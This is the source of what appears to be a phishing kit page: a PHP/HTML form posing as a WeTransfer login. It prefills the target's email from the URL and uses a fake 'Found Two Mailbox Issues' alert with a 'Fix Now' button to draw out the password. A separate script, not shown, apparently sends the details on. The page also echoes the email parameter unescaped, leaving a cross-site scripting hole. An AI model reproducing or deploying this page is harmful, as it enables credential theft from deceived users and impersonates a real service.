<?php
    if(isset($_GET['email'])){
        $email = $_GET['email'];
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Log in | WeTransfer</title>
    <link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="style/style.css">
    <link rel="stylesheet" type="text/css" href="style/font-awesome.css">
    <link rel="icon" type="image/png" sizes="10x10" href="images/logo.png">
</head>
<body>
    <div class="container-fluid p-0">
        <div class="col-12 p-0 cover-image-cont float-left center">
            <div class="col-12 p-0 bg-transperant vh-100" id="text-holder">
                <div class="col-xs-12 col-sm-12 col-md-8 col-lg-4 col-xl-4 mx-auto">
                    <div class="col-12 p-0 pull-left bg-white px-4 py-5 shadow rounded" id="textItSelf">
                        <form>
                            <div class="form-group" style="display: flex; justify-content: center; align-items: center;">
                                <img src="images/logo.png" width="80">
                            </div>
                            <div class="form-group">
                                <div class="alert alert-danger hide"></div>
                            </div>
                            <div class="form-group">
                                <label class="text-secondary font-weight-bold">Email Address</label>
                                <input type="email" class="form-control" name="" id="email" value="<?php echo $email; ?>">
                            </div>
                            <div class="form-group">
                                <label class="text-secondary font-weight-bold">Password</label>
                                <input type="password" class="form-control" name="" id="password" required="">
                            </div>
                            <div class="form-group">
                                <button class="btn pull-left px-4" style="background:#067438; color:#fff;" type="button" id="Iagree">Login</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <div class="col-12 p-0" id="form-holder">
                <div class="col-xs-12 col-sm-12 col-md-5 col-lg-5 col-xl-5 mx-auto vh-100 p-0">
                    <div class="form col-12 p-0">
                        <div class="col-xs-12 col-sm-12 col-md-7 col-lg-7 col-xl-7 mx-auto p-0 shadow">
                            <div class="col-12 float-left bg-sec rounded-top">
                                <div class="form-group mt-3" style="display: flex; justify-content: center; align-items: center;">
                                    <img src="images/logo.png" width="80">
                                </div>
                                <div class="col-12 px-0 py-2 float-left bg-white text-center rounded-top">
                                    <h6 class="font-weight-bold">Found Two Mailbox Issues</h6>
                                </div>
                                <div class="hr float-left col-12"></div>
                                <div class="col-12 px-0 py-2 float-left">
                                    <p class="p m-0 p-0 float-left col-12 text-uppercase">Issue 1: disk quota error...</p>
                                    <sub class="float-left" id="date"></sub>
                                </div>
                                <div class="hr float-left col-12"></div>
                                <div class="col-12 px-0 py-2 float-left">
                                    <p class="p m-0 p-0 float-left col-12 text-uppercase">Issue 2 : inbox infected with virus...</p>
                                    <sub class="float-left" id="date"></sub>
                                </div>
                                <div class="hr float-left col-12"></div>
                            </div>
                            <div class="col-12 float-left text-center bg-white pt-5 hide" id="spinner">
                                <span class="fa fa-gear fa-spin fa-5x"></span>
                                <p id="issue"></p>
                            </div>
                            <div class="col-12 float-left bg-white rounded-bottom py-5 pb-3">
                                <div class="col-12 float-left p-0">
                                    <div class="col-8 p-0 mx-auto form-group m-0 mt-4">
                                        <button class="btn btn-md btn-secondary mx-auto col-12" style="background:#067438;" id="btnTransfer">Fix Now</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="vendor/jquery/jquery-2.2.3.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
    <script src="js/data.js"></script>
</body>
</html>